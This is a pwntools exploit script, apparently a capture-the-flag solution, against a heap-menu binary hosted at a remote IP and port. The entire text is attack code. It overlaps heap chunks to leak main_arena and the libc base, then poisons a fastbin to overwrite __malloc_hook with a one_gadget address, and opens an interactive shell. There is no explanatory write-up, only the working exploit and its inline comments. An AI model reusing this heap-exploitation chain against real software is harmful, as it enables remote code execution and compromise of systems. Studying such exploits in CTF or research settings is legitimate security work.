from pwn import*
#p=process('./sf8-1')
p = remote('35.194.245.237',8088)
t = 0.05
### Gadget

### Definition 
def allocate(size):
	p.sendline('1')
	p.sendlineafter('Size: ',str(size))
	sleep(t)

def fill(index,size,content):
	p.sendline('2')
	p.sendlineafter('Index: ',str(index))
	p.sendlineafter('Size: ',str(size))
	p.sendafter('Content: ',content)
	sleep(t)

def free(index):
	p.sendline('3')
	p.sendlineafter('Index: ',str(index))
	sleep(t)

def dump(index):
	p.sendline('4')
	p.sendlineafter('Index: ',str(index))
	sleep(t)


### Exploit
# Libc leak
allocate(0x20)	# 0
allocate(0x20)	# 1
allocate(0x20)	# 2
allocate(0x100)	# 3
allocate(0x100) # 4
allocate(0x60)	# 5
allocate(0x60)	# 6

pay = ''
pay += p64(0)*5	
pay += p64(0x30)
fill(2,len(pay),pay)	# index 3 size: 0x110 -> 0x30

free(2)	
free(1)	# index 1 fd: index 2 addr

pay = ''
pay += p64(0)*5
pay += p64(0x30)
pay += p8(0x90)
fill(0,len(pay),pay)	# index 1 fd: index 2 addr -> index 3 addr

allocate(0x20)		# index 1 re-allocate
allocate(0x20)		# *** index 3 double-allocate ***
			# index 3 = index 2

pay = ''
pay += p64(0)*11
pay += p64(0x111)
fill(1,len(pay),pay)	# index 3 size: 0x30 -> 0x110
free(3)	# write main_arena on index 3 fd


dump(2)
p.recvuntil('Content: ')
p.recv(1)
main_arena = u64(p.recv(6).ljust(8,'\x00'))
libc_base = main_arena -0x3c4b78
log.info("main_arena : {}".format(hex(main_arena)))
log.info("libc_base  : {}".format(hex(libc_base)))
p.recv()
# exploit
target = main_arena - 139

allocate(0x100)
free(6)
free(5)
pay = ''
pay += p64(0)*33
pay += p64(0x71)
pay += p64(target)
fill(4,len(pay),pay)	# index 5 fd: index 6 -> malloc_hook

allocate(0x60)	# index 5
allocate(0x60)	# index 6

#one_list=[0x45226,0x4527a,0xf0364,0xf1207]
one_list = [0x45216,0x4526a,0xf02a4,0xf1147]


pay = ''
pay += p64(0)*2
pay += '\x00'*3
pay += p64(libc_base+one_list[1])
fill(6,len(pay),pay)

allocate(0x60)	# GET SHELL !!!
p.interactive()


